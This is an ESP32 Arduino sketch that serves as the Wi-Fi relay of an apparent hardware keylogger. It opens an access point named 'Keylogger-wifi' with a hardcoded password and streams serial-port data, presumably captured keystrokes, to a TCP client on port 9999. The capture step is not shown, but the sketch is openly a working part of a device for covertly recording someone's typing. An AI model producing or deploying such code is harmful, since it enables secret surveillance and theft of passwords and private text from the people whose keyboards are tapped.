#include <WiFi.h>
#include <WiFiClient.h>
#include <WiFiAP.h>

const char *ssid     = "Keylogger-wifi";
const char *password = "Azerty1234";

#define RXD1 16
#define TXD1 17

WiFiServer server(9999);

void setup() {
  Serial1.begin(115200, SERIAL_8N1, RXD1, TXD1);
  Serial1.setTimeout(50);

  if (!WiFi.softAP(ssid, password)) {
    log_e("Soft AP creation failed.");
    while(1);
  }
  IPAddress myIP = WiFi.softAPIP();
  server.begin();
}

void loop() {

  WiFiClient client = server.available(); // listen for incoming clients
  if (client) {
    while (client.connected()) {
      if (client.available()) { // attend que le client envoye un caractere
        String c = client.readString();
        for(int i=0; i<c.length(); i++) {
          Serial1.write(c[i]);
        }
      }
      if (Serial1.available()) {
        String c = Serial1.readString();
        for(int i=0; i<c.length(); i++) {
          client.write(c[i]);
          Serial1.write(c[i]);
        }
      }
    }
    client.stop();
  }
  if (Serial1.available()) {
    String c = Serial1.readString();
    for(int i=0; i<c.length(); i++) {
      Serial1.write(c[i]);
    }
  }
}
